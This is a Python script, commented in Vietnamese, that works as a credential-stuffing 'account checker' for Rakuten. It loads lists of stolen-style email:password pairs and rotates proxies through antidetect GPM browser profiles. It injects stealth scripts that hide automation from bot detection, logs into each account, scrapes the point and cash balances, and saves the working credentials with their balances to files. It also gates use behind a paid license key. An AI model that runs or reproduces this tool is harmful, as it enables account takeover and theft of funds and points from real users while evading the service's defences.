import time
import random
import logging
import threading
from queue import Queue
import os
import colorama
from datetime import datetime
import signal
import sys
import atexit
import shutil
import requests
import pyautogui
from playwright.sync_api import sync_playwright
from undetected_playwright import Tarnished
from fake_useragent import UserAgent

colorama.init()

# Global variables
successful_accounts = []
failed_accounts = []
browsers = []
stop_event = threading.Event()
failed_start_profile_count = 0

class GPMLoginAPI:
    def __init__(self):
        self.base_url = "http://127.0.0.1:19995"
        self.session = requests.Session()
    
    def create_profile(self, proxy, name):
        # Tạo cấu hình mới với proxy HTTP và hệ điều hành Windows
        payload = {
            "profile_name": f"{name}_{random.randint(1000, 9999)}",
            "group_name": "All",
            "browser_core": "chromium",
            "browser_name": "Chrome",
            "browser_version": "119.0.0.0",
            "is_random_browser_version": False,
            "raw_proxy": f"{proxy}" if proxy else "",
            "startup_urls": "",
            "is_masked_font": True,
            "is_noise_canvas": False,
            "is_noise_webgl": False,
            "is_noise_client_rect": False,
            "is_noise_audio_context": True,
            "is_random_screen": False,
            "is_masked_webgl_data": True,
            "is_masked_media_device": True,
            "is_random_os": False,
            "os": "Windows 11",
            "webrtc_mode": 2,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        }
        response = self.session.post(f"{self.base_url}/api/v3/profiles/create", json=payload)
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {}).get("id")
        logging.error(f"CẢNH BÁO: Không tạo được cấu hình với proxy {proxy}")
        return None
    
    def start_profile(self, profile_id, x=None, y=None, w=None, h=None):
        global failed_start_profile_count
        # Khởi động trình duyệt cho cấu hình
        win_params = ""
        if x is not None and y is not None:
            win_params += f"&win_pos={x},{y}"
        if w is not None and h is not None:
            win_params += f"&win_size={w},{h}"
            
        response = self.session.get(f"{self.base_url}/api/v3/profiles/start/{profile_id}?{win_params}")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không khởi động được cấu hình {profile_id} {response.json().get('message')}")
        failed_start_profile_count += 1
        if (failed_start_profile_count >= 10):
            stop_event.set()
            time.sleep(5)
            os._exit(1)
        return None

    def close_profile(self, profile_id):
        # Đóng trình duyệt
        response = self.session.get(f"{self.base_url}/api/v3/profiles/close/{profile_id}")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không đóng được cấu hình {profile_id} {response.json().get('message')}")
        return None

    def delete_profile(self, profile_id):
        # Xoá cấu hình
        response = self.session.delete(f"{self.base_url}/api/v3/profiles/delete/{profile_id}?mode=2")
        if response.status_code == 200 and response.json().get("success"):
            return response.json().get("data", {})
        logging.error(f"CẢNH BÁO: Không xoá được cấu hình {profile_id} {response.json().get('message')}")
        return None

def cleanup_browsers():
    """Dọn dẹp tất cả các Browser instances."""
    logging.warning("Đang dọn dẹp browsers...")
    global browsers
    for browser in browsers[:]:
        try:
            browser.close()
        except Exception as e:
            logging.warning(f"Lỗi khi đóng browser: {e}")
        finally:
            if browser in browsers:
                browsers.remove(browser)

def signal_handler(sig, frame):
    """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
    logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
    cleanup_browsers()
    logging.info("Dọn dẹp hoàn tất. Thoát...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('rakuten_automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs
logging.getLogger('playwright').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.Lock()
show_browser = True

def load_input_files():
    """Tải tài khoản từ accounts.txt và proxy từ proxy.txt"""
    try:
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })
        
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username:password
                            try:
                                host_port, credentials = line.split('@', 1)
                                if ':' in credentials:
                                    username, password = credentials.split(':', 1)
                                else:
                                    username, password = credentials, ""
                                
                                proxies.append({
                                    'server': f"http://{host_port}",
                                    'username': username,
                                    'password': password,
                                    'full': line
                                })
                            except Exception as e:
                                logging.warning(f"Không thể parse proxy: {line} - {e}")
                        else:
                            # Handle format: host:port:username:password or host:port
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': parts[2],
                                    'password': parts[3],
                                    'full': line
                                })
                            elif len(parts) >= 2:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': None,
                                    'password': None,
                                    'full': line
                                })
        except FileNotFoundError:
            logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
        
        if not accounts:
            logging.error("Không tìm thấy tài khoản hợp lệ trong accounts.txt")
            raise ValueError("Không có tài khoản để xử lý")
        
        logging.info(f"Đã tải {len(accounts)} tài khoản và {len(proxies)} proxy")
        return accounts, proxies
    
    except Exception as e:
        logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
        raise

def init_browser_with_gpm(gpm_api, proxy, email, size=(1366, 768)):
    """Khởi tạo Playwright browser với GPM API"""
    profile_id = None
    try:
        # Create profile with proxy
        profile_id = gpm_api.create_profile(proxy, email)
        if not profile_id:
            return None, None, None, None, None, None
        
        # Start profile
        profile_data = gpm_api.start_profile(profile_id)
        if not profile_data:
            gpm_api.delete_profile(profile_id)
            return None, None, None, None, None, None
        
        # Get remote debugging port
        remote_port = profile_data.get("remote_debugging_port")
        if not remote_port:
            logging.error("Không lấy được remote debugging port")
            gpm_api.close_profile(profile_id)
            gpm_api.delete_profile(profile_id)
            return None, None, None, None, None, None
        
        # Connect Playwright to existing browser instance
        playwright = sync_playwright().start()
        
        # Connect to existing browser via CDP
        browser = playwright.chromium.connect_over_cdp(f"http://127.0.0.1:{remote_port}")
        
        # Get the default context and page (GPM should already have opened one)
        contexts = browser.contexts
        if contexts:
            context = contexts[0]
        else:
            # If no context exists, create one
            ua = UserAgent()
            random_user_agent = ua.chrome
            context = browser.new_context(
                user_agent=random_user_agent,
                viewport={'width': size[0], 'height': size[1]},
                locale='ja-JP',
                timezone_id='Asia/Tokyo',
                geolocation={'latitude': 35.6895, 'longitude': 139.6917},
                permissions=['geolocation']
            )
        
        # Apply stealth
        Tarnished.apply_stealth(context)
        
        # Anti-detection scripts
        context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            window.navigator.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
            Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP', 'ja', 'en-US', 'en'] });
        """)
        
        # Get existing page or create new one
        pages = context.pages
        if pages:
            page = pages[0]
        else:
            page = context.new_page()
        
        return browser, context, page, None, playwright, profile_id
        
    except Exception as e:
        logging.error(f"Lỗi khởi tạo browser với GPM: {e}")
        if profile_id:
            gpm_api.close_profile(profile_id)
            gpm_api.delete_profile(profile_id)
        return None, None, None, None, None, None

def human_type(page, selector, text, min_delay=0.05, max_delay=0.15):
    """Type text with human-like delay"""
    page.fill(selector, "")  # Clear first
    for char in text:
        page.type(selector, char, delay=random.uniform(min_delay, max_delay) * 1000)

def _remove_account_from_file(email):
    """Remove account from accounts.txt file"""
    try:
        with file_lock:
            with open('accounts.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            with open('accounts.txt', 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        parts = line.strip().split(':')
                        if len(parts) >= 1 and parts[0].strip() != email:
                            f.write(line)
                    else:
                        f.write(line)
            logging.debug(f"🗑️ Đã xóa {email} khỏi accounts.txt")
    except Exception as e:
        logging.warning(f"Không thể xóa {email} khỏi accounts.txt: {e}")

def check_rakuten_account(page, email, password):
    """Kiểm tra tài khoản Rakuten với Playwright"""
    try:
        logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
        
        # Navigate to login page with retry logic
        login_url = ("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in")
        
        # Try to navigate with retry mechanism
        max_retries = 3
        for attempt in range(max_retries):
            try:
                page.goto(login_url, timeout=60000)  # 60 seconds timeout
                logging.debug(f"Successfully navigated to login page for {email} (attempt {attempt + 1})")
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    logging.debug(f"Failed to navigate to login page for {email} after {max_retries} attempts: {repr(e)}")
                    raise
                else:
                    logging.debug(f"Navigation attempt {attempt + 1} failed for {email}, retrying... Error: {repr(e)}")
                    time.sleep(5)  # Wait before retry

        time.sleep(random.randint(2, 5))
        
        # Step 1: Enter email
        if not _enter_email(page, email):
            result = False, f"Lỗi nhập email cho {email}"
        # Step 2: Enter password
        elif not _enter_password(page, password):
            result = False, f"Lỗi nhập password cho {email}"
        # Step 3: Check login success
        elif not _check_login_success(page, email):
            result = False, "Đăng nhập thất bại"
        else:
            # Step 4: Check points
            result = _check_points(page, email, password)
        
        _remove_account_from_file(email)        
        return result
            
    except Exception as e:
        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
        # Remove account even if there's an exception
        _remove_account_from_file(email)
        return False, repr(e)

def _enter_email(page, email):
    """Enter email in login form"""
    try:
        # Wait for email input field
        page.wait_for_selector("input[name='username']", timeout=30000)
        
        # Type email with human-like delay
        page.fill("input[name='username']", email)
        time.sleep(random.randint(1, 2))
        
        # Click first submit button (Next)
        page.click("#cta001")
        time.sleep(random.randint(2, 4))
        
        return True
        
    except Exception as e:
        logging.debug(f"Lỗi khi nhập email: {repr(e)}")
        return False

def _enter_password(page, password):
    """Enter password in login form"""
    try:
        # Wait for password input field
        page.wait_for_selector("input[name='password']", timeout=30000)
        
        # Type password with human-like delay
        page.fill("input[name='password']", password)
        time.sleep(random.randint(1, 2))
        
        # Click second submit button (Next)
        page.click("#cta011")
        
        # Wait for login to process
        time.sleep(5)
        
        return True
        
    except Exception as e:
        debug_folder = "debug_output"
        os.makedirs(debug_folder, exist_ok=True)
        
        logging.error(f"Không tìm thấy ô password. Bắt đầu thu thập bằng chứng...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(debug_folder, f"debug_screenshot_{timestamp}.png")
        page.screenshot(path=screenshot_path, full_page=True)
        logging.info(f"Đã lưu ảnh chụp màn hình lỗi tại: {screenshot_path}")
        html_path = os.path.join(debug_folder, f"debug_page_{timestamp}.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(page.content())
        logging.info(f"Đã lưu mã HTML của trang lỗi tại: {html_path}")
        return False

def _check_login_success(page, email):
    """Check if login was successful"""
    try:
        # Wait for potential redirect to rakuten.co.jp domain with longer timeout for slow proxies
        page.wait_for_function(
            "window.location.href.includes('rakuten.co.jp')",
            timeout=30000  # Increased to 30 seconds for slow proxies
        )
        
        current_url = page.url
        
        # If still on login page, login failed
        if "login.account.rakuten.com" in current_url:
            # Check for error messages
            try:
                error_elements = page.query_selector_all(".error, .alert, [class*='error'], [class*='alert']")
                if error_elements:
                    error_text = error_elements[0].text_content()
                    logging.debug(f"Đăng nhập thất bại cho {email}: {error_text}")
                    return False
            except:
                pass
            
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
            return False
        
        return True
        
    except Exception as e:
        logging.debug(f"Timeout hoặc lỗi chờ redirect cho {email}: {repr(e)}")
        return False

def _check_points(page, email, password):
    """Check points information and save to appropriate file"""
    try:
        # Navigate to points page with retry
        points_url = "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"
        
        def goto_link(url):
            max_retries = 2
            for attempt in range(max_retries):
                try:
                    page.goto(url, timeout=30000) 
                    page.wait_for_load_state('networkidle', timeout=15000)
                    break
                except Exception as e:
                    if attempt == max_retries - 1:
                        logging.debug(f"Failed to navigate to points page for {email}: {repr(e)}")
                        return True, f"Đăng nhập thành công nhưng không thể truy cập trang điểm : {url}"
                    else:
                        logging.debug(f"Points page navigation attempt {attempt + 1} failed for {email}, retrying...")
                        time.sleep(3)

        goto_link(points_url)
        
        points_details = []
        
        try:
            try:
                page.wait_for_selector(".point-total dd", timeout=5000)
                held_points_element = page.query_selector(".point-total dd")
                if held_points_element:
                    held_points_text = held_points_element.text_content().strip()
                    held_points_clean = ''.join(filter(str.isdigit, held_points_text))
                    if held_points_clean:
                        held_points_value = int(held_points_clean)
                        points_details.append(f"Total Point: {held_points_value:,}")
                        logging.debug(f"📊 {email} - Points total: {held_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points total' cho {email}")

            try:
                page.wait_for_selector(".point-gadget-display-point .point_num", timeout=5000)
                operation_points_element = page.query_selector(".point-gadget-display-point .point_num")
                if operation_points_element:
                    operation_points_text = operation_points_element.text_content().strip()
                    operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
                    if operation_points_clean:
                        operation_points_value = int(operation_points_clean)
                        points_details.append(f"Operation: {operation_points_value:,}")
                        logging.debug(f"📈 {email} - Points in operation: {operation_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points in operation' cho {email}")

            try:
                page.wait_for_selector("#js-pointBankTotalBalance .point_num", timeout=5000)
                add_points_element = page.query_selector("#js-pointBankTotalBalance .point_num")
                if add_points_element:
                    add_points_text = add_points_element.text_content().strip()
                    add_points_clean = ''.join(filter(str.isdigit, add_points_text))
                    if add_points_clean:
                        add_points_value = int(add_points_clean)
                        points_details.append(f"Add: {add_points_value:,}")
                        logging.debug(f"➕ {email} - Points add: {add_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points add' cho {email}")

            goto_link("https://my.rakuten.co.jp/?l-id=pc_footer_account")
            time.sleep(3)

            try:
                page.wait_for_selector('[data-ratid="available-rcash-area"]', timeout=5000)
                cash_points_element = page.query_selector('[data-ratid="available-rcash-area"] span:nth-child(2)')
                if cash_points_element:
                    cash_points_text = cash_points_element.text_content().strip()
                    cash_points_clean = ''.join(filter(str.isdigit, cash_points_text))
                    if cash_points_clean:
                        cash_points_value = int(cash_points_clean)
                        points_details.append(f"Cash: {cash_points_value:,}")
                        logging.debug(f"💰 {email} - Cash Point: {cash_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Cash Point' cho {email}")
            
            if len(points_details) > 0:
                points_summary = " | ".join(points_details)
                logging.info(f"✅ {email} - ({points_summary})")
                
                # Save to appropriate file based on points
                with file_lock:
                    with open('point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|{points_summary}\n")
                    return True, f"Có điểm: ({points_summary})"
            else:
                logging.info(f"📭 {email} - Không có điểm")
                with file_lock:
                    with open('no_point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|0\n")
                    return True, "Không có điểm"
                
        except Exception as e:
            logging.debug(f"Không tìm thấy thông tin điểm cho {email}: {repr(e)}")
            # Still consider login successful even if can't read points
            return True, "Đăng nhập thành công nhưng không tìm thấy điểm"
            
    except Exception as e:
        logging.debug(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
        return True, "Đăng nhập thành công nhưng lỗi kiểm tra điểm"

def process_account(gpm_api, account, account_index, proxy_info):
    """Xử lý một tài khoản với GPM API"""
    email, password = account['email'], account['password']
    browser = None
    context = None
    playwright = None
    profile_id = None
    
    try:
        logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
        
        # Initialize browser with GPM
        browser, context, page, _, playwright, profile_id = init_browser_with_gpm(
            gpm_api, 
            proxy_info.get('full') if proxy_info else None, 
            email
        )
        if not browser:
            raise Exception("Không thể khởi tạo browser với GPM")
        
        browsers.append(browser)
        
        success, message = check_rakuten_account(page, email, password)
        if not success:
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
            
        with file_lock:
            if success:
                successful_accounts.append(account)
                # Lưu tài khoản thành công
                with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}\n")
            else:
                failed_accounts.append({'account': account, 'error': message})
                # Lưu tài khoản thất bại
                with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}\n")
        logging.info(f"Hoàn tất xử lý tài khoản: {email}")
        
    except Exception as e:
        logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
        with file_lock:
            failed_accounts.append({'account': account, 'error': repr(e)})
            with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
    finally:
        # Cleanup browser and profile
        try:
            if context:
                context.close()
            if browser:
                browser.close()
                if browser in browsers:
                    browsers.remove(browser)
            if playwright:
                playwright.stop()
            if profile_id:
                gpm_api.close_profile(profile_id)
                gpm_api.delete_profile(profile_id)
        except Exception as e:
            logging.debug(f"Lỗi khi đóng browser/profile: {e}")

def check_key_live():
    """Kiểm tra key có live không từ GitHub"""
    try:
        trial_url = "https://raw.githubusercontent.com/sang2770/storage/master/trial.json"
        
        logging.info("Đang kiểm tra key live...")
        response = requests.get(trial_url, timeout=10)
        
        if response.status_code == 404:
            logging.error("❌ Key đã hết hạn hoặc không tồn tại (404).")
            print("\n" + "="*50)
            print("🔑 KEY ĐÃ HẾT HẠN HOẶC KHÔNG TỒN TẠI")
            print("Vui lòng liên hệ để gia hạn key.")
            print("="*50)
            return False
        elif response.status_code == 200:
            logging.info("✅ Key live - Cho phép chạy chương trình.")
            return True
        else:
            logging.warning(f"⚠️ Không thể kiểm tra key (HTTP {response.status_code}). Tiếp tục chạy...")
            return True
            
    except requests.exceptions.Timeout:
        logging.warning("⚠️ Timeout khi kiểm tra key. Tiếp tục chạy...")
        return True
    except requests.exceptions.ConnectionError:
        logging.warning("⚠️ Không có kết nối internet. Tiếp tục chạy...")
        return True
    except Exception as e:
        logging.warning(f"⚠️ Lỗi khi kiểm tra key: {repr(e)}. Tiếp tục chạy...")
        return True

def main():
    """Hàm chính"""
    global show_browser
    
    # Check if key is live before proceeding
    if not check_key_live():
        logging.error("Dừng chương trình do key không hợp lệ.")
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    try:
        # Initialize GPM API
        gpm_api = GPMLoginAPI()
        
        # Load input files
        accounts, proxies = load_input_files()
        
        # Get number of threads
        try:
            num_threads = int(input("Nhập số luồng để chạy: "))
            if num_threads <= 0:
                logging.warning("Số luồng phải là số dương. Đặt mặc định là 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"Số luồng ({num_threads}) vượt quá số tài khoản ({len(accounts)}). Đặt thành {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("Đầu vào số luồng không hợp lệ. Đặt mặc định là 1.")
            num_threads = 1
        
        # Nhập lựa chọn hiển thị trình duyệt
        show = input("Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ").strip().lower()
        show_browser = show in ['y', 'yes']
                
        # Setup account queue
        account_queue = Queue()
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        def worker():
            """Hàm worker thread"""
            while not account_queue.empty() and not stop_event.is_set():
                try:
                    account, account_index = account_queue.get()
                    proxy_info = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                    
                    # Debug logging for proxy
                    if proxy_info:
                        logging.debug(f"Using proxy for {account['email']}: {proxy_info}")
                    
                    process_account(gpm_api, account, account_index, proxy_info)

                except Exception as e:
                    logging.error(f"Lỗi trong worker thread: {repr(e)}")
                    # Log the account as failed
                    with file_lock:
                        failed_accounts.append({'account': account, 'error': repr(e)})
                        with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{account['email']}|{account['password']}|{repr(e)}\n")
                
                finally:
                    account_queue.task_done()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, name=f"Luồng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Báo cáo cuối cùng
        logging.info("Đã xử lý xong tất cả tài khoản.")
        logging.info(f"✅ Đăng ký thành công: {len(successful_accounts)}")
        logging.info(f"❌ Đăng ký thất bại: {len(failed_accounts)}")
        
        logging.info("Chương trình hoàn tất. Thoát sau 5 giây...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"Lỗi trong hàm main: {repr(e)}")
    finally:
        cleanup_browsers()

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, cleanup_browsers)
        signal.signal(signal.SIGINT, cleanup_browsers)
        atexit.register(cleanup_browsers)
        main()
    except KeyboardInterrupt:
        logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
        cleanup_browsers()
        logging.info("Dọn dẹp hoàn tất. Thoát...")
        sys.exit(0)
